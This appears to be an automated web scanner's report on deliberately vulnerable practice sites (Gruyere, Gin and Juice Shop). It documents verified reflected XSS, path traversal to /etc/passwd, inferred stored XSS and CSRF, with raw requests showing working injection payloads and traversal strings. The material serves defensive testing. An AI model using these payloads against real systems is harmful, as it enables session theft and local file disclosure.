    RESPONSE 400
      date: Sat, 03 Oct 2026 22:26:30 GMT
      content-type: application/json; charset=utf-8
      content-length: 31
      connection: keep-alive
      set-cookie: AWSALBCORS=[REDACTED]
      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
      x-frame-options: SAMEORIGIN
      body[0:200]: "Missing parameter 'productId'"

**[IMPACT] — verified**

  client-side code execution combined with an unprotected state change: arbitrary actions performable in the victim's session

  - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
    finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
      evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
    finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
      verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3

</details>


## gruyere2 — https://google-gruyere.appspot.com (run run-228ffb67c9, scanner sentinel-core/4.3.0)

**L2 SOURCE (honesty note): fresh v4.3.0 live scan (run-228ffb67c9, seed 7f3c91aa); attack paths REBUILT with the citation-integrity hotfix (rotating-cookie citation pairing) — identical to what the shipped pipeline now embeds via orchestrator.report()**

**3 paths: 2 VERIFIED / 1 INFERRED** (3 single-finding, 0 chains) — weak-link histogram: `{'impact': 1}`

Seeds used: `F-4eac8c9136, F-85f0251945, F-fada1dc319`; non-seed findings (annotation-only classes): `{"F-029676c016": "missing_security_headers", "F-080c9fd41e": "missing_security_headers", "F-0bcf0d13ac": "missing_security_headers", "F-1240b60e65": "missing_security_headers", "F-202c00f44f": "missing_security_headers", "F-224edc0f19": "missing_security_headers", "F-23eec3e8a3": "missing_security_headers", "F-32aece35c2": "missing_security_headers", "F-347ef990f9": "missing_security_headers", "F-44d4b5e636": "missing_security_headers", "F-46420f47ec": "missing_security_headers", "F-4dd82d6d06": "missing_security_headers", "F-5637803d03": "missing_security_headers", "F-5915a8397b": "missing_security_headers", "F-63382386bd": "missing_security_headers", "F-63dca1e88d": "missing_security_headers", "F-67aedd2cd9": "missing_security_headers", "F-67d5880030": "missing_security_headers", "F-695afc490f": "missing_security_headers", "F-788a049493": "missing_security_headers", "F-87a7a0a005": "missing_security_headers", "F-9110f945df": "missing_security_headers", "F-9b8c811669": "missing_security_headers", "F-9c769f43ff": "missing_security_headers", "F-a666681581": "missing_security_headers", "F-beb99f50e5": "missing_security_headers", "F-c000787b50": "missing_security_headers", "F-c03b46fbb4": "missing_security_headers", "F-ca0bb9f032": "missing_security_headers", "F-d5a74ba908": "missing_security_headers", "F-e6ca3acf54": "missing_security_headers", "F-ec74d7e7e0": "missing_security_headers", "F-f0d353f73d": "missing_security_headers", "F-f32d0af5f6": "missing_security_headers", "F-f380dea4ab": "missing_security_headers"}`


### AP-5536d869bb — VERIFIED — xss_reflected at /479896317371227311345106373618080751617/snippets.gtl — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-fada1dc319 | chain_rule: — | mitigations absent: ["content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy"]

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie GRUYERE, GRUYERE_ID carried by the raw proving requests; issued by the target on response req-0518d7a0 (an unauthenticated fetch of a public surface); no Authorization/credential material i |
| **entry** | verified | GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl — parameter uid |
| **action** | verified | attacker-supplied markup/JavaScript injected through the parameter survives into the response in an executable context |
| **object** | verified | the HTTP response rendered to the victim (twin entity typing: User) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without furth |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie GRUYERE, GRUYERE_ID carried by the raw proving requests; issued by the target on response req-0518d7a0 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-4948a774` excerpt: `GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl?uid=%3Cdetails+open+ontoggle%3Dsentinel42%28%29%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      x-xss-protection: 0
      x-cloud-trace-context: 0e2e60c727dbff01aa6ca7c186bd90d8
      date: Sun, 04 Oct 2026 02:27:49 GMT
      server: Google Frontend
      content-length: 3011
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Snippets</title>
<style>
/* Copyright 2017 Google Inc. */

body, html,
  - `journal` ref `req-0518d7a0` excerpt: `GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E&pw=&is_author=True
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=37929950|<svg_onload=sentinel42()>||author; GRUYERE_ID=4798963173712273113451063736180807516
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      set-cookie: GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617
      x-xss-protection: 0
      x-cloud-trace-context: 062b267b2d453dfc4690cd2b54348c71
      date: Sun, 04 Oct 2026 02:29:14 GMT
      server: Google Frontend
      content-length: 2224
      expires: Sun, 04 Oct 2026 02:29:14 GMT
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Error</title>
<style>
/* Copyright 2017 Google Inc. */

body, html, td
  - `finding` ref `F-fada1dc319` excerpt: `canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</`
    finding: xss_reflected GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl param=uid status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</sentinelxssmarker>      </h2> 
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarkerpro42      </h2> <div class='refres… [
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[ENTRY] — verified**

  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl — parameter uid

  - `finding` ref `F-fada1dc319` excerpt: `canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</`
    finding: xss_reflected GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl param=uid status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</sentinelxssmarker>      </h2> 
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarkerpro42      </h2> <div class='refres… [
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `journal` ref `req-1047d6a2` excerpt: `https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl?uid=%3Ciframe+srcdoc%3Dsentinel4`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl?uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      x-xss-protection: 0
      x-cloud-trace-context: 04d1a3537ed90f5c4ec7f151402185b4
      date: Sun, 04 Oct 2026 02:27:50 GMT
      server: Google Frontend
      content-length: 2987
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Snippets</title>
<style>
/* Copyright 2017 Google Inc. */

body, html,

**[ACTION] — verified**

  attacker-supplied markup/JavaScript injected through the parameter survives into the response in an executable context

  - `finding` ref `F-fada1dc319` excerpt: `verification: re-test:variant-battery-6 (passed=True)`
    finding: xss_reflected GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl param=uid status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</sentinelxssmarker>      </h2> 
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarkerpro42      </h2> <div class='refres… [
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `journal` ref `req-1047d6a2` excerpt: `https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl?uid=%3Ciframe+srcdoc%3Dsentinel4`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl?uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      x-xss-protection: 0
      x-cloud-trace-context: 04d1a3537ed90f5c4ec7f151402185b4
      date: Sun, 04 Oct 2026 02:27:50 GMT
      server: Google Frontend
      content-length: 2987
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Snippets</title>
<style>
/* Copyright 2017 Google Inc. */

body, html,

**[OBJECT] — verified**

  the HTTP response rendered to the victim (twin entity typing: User)

  - `finding` ref `F-fada1dc319` excerpt: `canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</`
    finding: xss_reflected GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl param=uid status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</sentinelxssmarker>      </h2> 
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarkerpro42      </h2> <div class='refres… [
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
  - `twin` ref `stats.digital_twin.entity_inventory` excerpt: `{"carried_by_params": 3, "consumed_by_steps": [], "entity": "User", "minted_by_steps": [], "surfaces": ["GET /4798963173`
    twin row: {"carried_by_params": 3, "consumed_by_steps": [], "entity": "User", "minted_by_steps": [], "surfaces": ["GET /4798963173

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-1047d6a2` excerpt: `GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl?uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      x-xss-protection: 0
      x-cloud-trace-context: 04d1a3537ed90f5c4ec7f151402185b4
      date: Sun, 04 Oct 2026 02:27:50 GMT
      server: Google Frontend
      content-length: 2987
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Snippets</title>
<style>
/* Copyright 2017 Google Inc. */

body, html,
  - `finding` ref `F-fada1dc319` excerpt: `canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</`
    finding: xss_reflected GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl param=uid status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</sentinelxssmarker>      </h2> 
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarkerpro42      </h2> <div class='refres… [
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-fada1dc319` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: xss_reflected GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl param=uid status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</sentinelxssmarker>      </h2> 
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarkerpro42      </h2> <div class='refres… [
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

**[IMPACT] — verified**

  Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.

  - `finding` ref `F-fada1dc319` excerpt: `impact grade=proven; chain: re-test:variant-battery-6 on GET https://google-gruyere.appspot.com/479896317371227311345106`
    finding: xss_reflected GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl param=uid status=verified conf=0.9
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</sentinelxssmarker>      </h2> 
      evidence[unescaped_reflection]: canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarkerpro42      </h2> <div class='refres… [
      verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6

</details>


### AP-d4e30915d5 — VERIFIED — path_traversal at /479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-4eac8c9136 | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie GRUYERE, GRUYERE_ID carried by the raw proving requests; issued by the target on response req-0518d7a0 (an unauthenticated fetch of a public surface); no Authorization/credential material i |
| **entry** | verified | GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd (no parameter) |
| **action** | verified | dot-dot traversal sequences injected into the path/parameter to escape the document root |
| **object** | verified | the local filesystem outside the document root |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | File reads outside the document root proven with a marker file — arbitrary local file disclosure (configuration, secrets, source) is reachable. |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie GRUYERE, GRUYERE_ID carried by the raw proving requests; issued by the target on response req-0518d7a0 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-45502df3` excerpt: `GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617
    RESPONSE 200
      content-type: text/plain
      cache-control: public, max-age=7200
      x-xss-protection: 0
      x-cloud-trace-context: f4a9788f3377cdf2de50f75ceeebbe8b
      date: Sun, 04 Oct 2026 02:23:32 GMT
      server: Google Frontend
      content-length: 246
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
gruyere:x:530:1117:sys:/dev:/bin/macr
# If this were a real passwd file you wo
  - `journal` ref `req-0518d7a0` excerpt: `GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E&pw=&is_author=True
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=37929950|<svg_onload=sentinel42()>||author; GRUYERE_ID=4798963173712273113451063736180807516
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      set-cookie: GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617
      x-xss-protection: 0
      x-cloud-trace-context: 062b267b2d453dfc4690cd2b54348c71
      date: Sun, 04 Oct 2026 02:29:14 GMT
      server: Google Frontend
      content-length: 2224
      expires: Sun, 04 Oct 2026 02:29:14 GMT
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Error</title>
<style>
/* Copyright 2017 Google Inc. */

body, html, td
  - `finding` ref `F-4eac8c9136` excerpt: `content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)`
    finding: path_traversal GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd param= status=verified conf=0.9
      evidence[path_file_marker]: content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)
      verification: re-test:same-path-marker passed=True conf=0.9 rounds=1

**[ENTRY] — verified**

  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd (no parameter)

  - `finding` ref `F-4eac8c9136` excerpt: `content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)`
    finding: path_traversal GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd param= status=verified conf=0.9
      evidence[path_file_marker]: content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)
      verification: re-test:same-path-marker passed=True conf=0.9 rounds=1
  - `journal` ref `req-24276676` excerpt: `https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617
    RESPONSE 200
      content-type: text/plain
      cache-control: public, max-age=7200
      x-xss-protection: 0
      x-cloud-trace-context: 7b9a0019495d4759d9e7eab87cf63b5f
      date: Sun, 04 Oct 2026 02:23:31 GMT
      server: Google Frontend
      content-length: 246
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
gruyere:x:530:1117:sys:/dev:/bin/macr
# If this were a real passwd file you wo

**[ACTION] — verified**

  dot-dot traversal sequences injected into the path/parameter to escape the document root

  - `finding` ref `F-4eac8c9136` excerpt: `verification: re-test:same-path-marker (passed=True)`
    finding: path_traversal GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd param= status=verified conf=0.9
      evidence[path_file_marker]: content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)
      verification: re-test:same-path-marker passed=True conf=0.9 rounds=1
  - `journal` ref `req-24276676` excerpt: `https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617
    RESPONSE 200
      content-type: text/plain
      cache-control: public, max-age=7200
      x-xss-protection: 0
      x-cloud-trace-context: 7b9a0019495d4759d9e7eab87cf63b5f
      date: Sun, 04 Oct 2026 02:23:31 GMT
      server: Google Frontend
      content-length: 246
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
gruyere:x:530:1117:sys:/dev:/bin/macr
# If this were a real passwd file you wo

**[OBJECT] — verified**

  the local filesystem outside the document root

  - `finding` ref `F-4eac8c9136` excerpt: `content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)`
    finding: path_traversal GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd param= status=verified conf=0.9
      evidence[path_file_marker]: content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)
      verification: re-test:same-path-marker passed=True conf=0.9 rounds=1

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-24276676` excerpt: `GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617
    RESPONSE 200
      content-type: text/plain
      cache-control: public, max-age=7200
      x-xss-protection: 0
      x-cloud-trace-context: 7b9a0019495d4759d9e7eab87cf63b5f
      date: Sun, 04 Oct 2026 02:23:31 GMT
      server: Google Frontend
      content-length: 246
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: root:x:0:0:root:/root:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
gruyere:x:530:1117:sys:/dev:/bin/macr
# If this were a real passwd file you wo
  - `finding` ref `F-4eac8c9136` excerpt: `content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)`
    finding: path_traversal GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd param= status=verified conf=0.9
      evidence[path_file_marker]: content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)
      verification: re-test:same-path-marker passed=True conf=0.9 rounds=1

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-4eac8c9136` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: path_traversal GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd param= status=verified conf=0.9
      evidence[path_file_marker]: content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)
      verification: re-test:same-path-marker passed=True conf=0.9 rounds=1

**[IMPACT] — verified**

  File reads outside the document root proven with a marker file — arbitrary local file disclosure (configuration, secrets, source) is reachable.

  - `finding` ref `F-4eac8c9136` excerpt: `impact grade=proven; chain: re-test:same-path-marker on GET https://google-gruyere.appspot.com/4798963173712273113451063`
    finding: path_traversal GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd param= status=verified conf=0.9
      evidence[path_file_marker]: content of /etc/passwd leaked via URL-PATH traversal (marker 'root:x:0:0:' at offset 0)
      verification: re-test:same-path-marker passed=True conf=0.9 rounds=1

</details>


### AP-5b1cc6e95d — INFERRED — xss_stored at /479896317371227311345106373618080751617/saveprofile — single-finding path
**INFERRED — weak links: impact. The path is NOT presented as proof; the unproven links are named above.**

findings: F-85f0251945 | chain_rule: — | mitigations absent: ["content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy"]

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie GRUYERE, GRUYERE_ID carried by the raw proving requests; issued by the target on response req-0518d7a0 (an unauthenticated fetch of a public surface); no Authorization/credential material i |
| **entry** | verified | GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile — parameter uid |
| **action** | verified | canary markup submitted through the real form (all form fields ridden verbatim) and persisted server-side |
| **object** | verified | the persisted user record (the canary survived an independent re-fetch — the record exists server-side) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | payload persisted server-side: the canary survived an independent re-fetch on the render surface (engine-observed reflection; the raw journal retains the re-fetch request — its bounded response window does not reach the  |
| **impact** | inferred | defect VERIFIED (canary markup submitted via the real form persisted server-side and rendered RAW on https:) but the end impact was NOT directly demonstrated (impact grade 'indicated') — the impact claim is inferred from |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie GRUYERE, GRUYERE_ID carried by the raw proving requests; issued by the target on response req-0518d7a0 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-2e4d9555` excerpt: `GRUYERE=102987670|<sentinelstvr2>||author; GRUYERE_ID=479896317371227311345106373618080751617`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/newaccount.gtl
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
      Cookie: GRUYERE=102987670|<sentinelstvr2>||author; GRUYERE_ID=479896317371227311345106373618080751617
    RESPONSE 200
      cache-control: no-cache
      content-type: text/html
      pragma: no-cache
      x-xss-protection: 0
      x-cloud-trace-context: e4466f8f85799f8f318fe1b3f1d16501
      date: Sun, 04 Oct 2026 02:30:28 GMT
      server: Google Frontend
      content-length: 3348
      alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
      body[0:200]: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Gruyere: Profile</title>
<style>
/* Copyright 2017 Google Inc. */

body, html, 
  - `journal` ref `req-0518d7a0` excerpt: `GRUYERE=93319462|<iframe srcdoc=sentinel42()>||author; path=/479896317371227311345106373618080751617`
    REQUEST  GET https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Ciframe+srcdoc%3Dsentinel42%28%29%3E&pw=&is_author=True
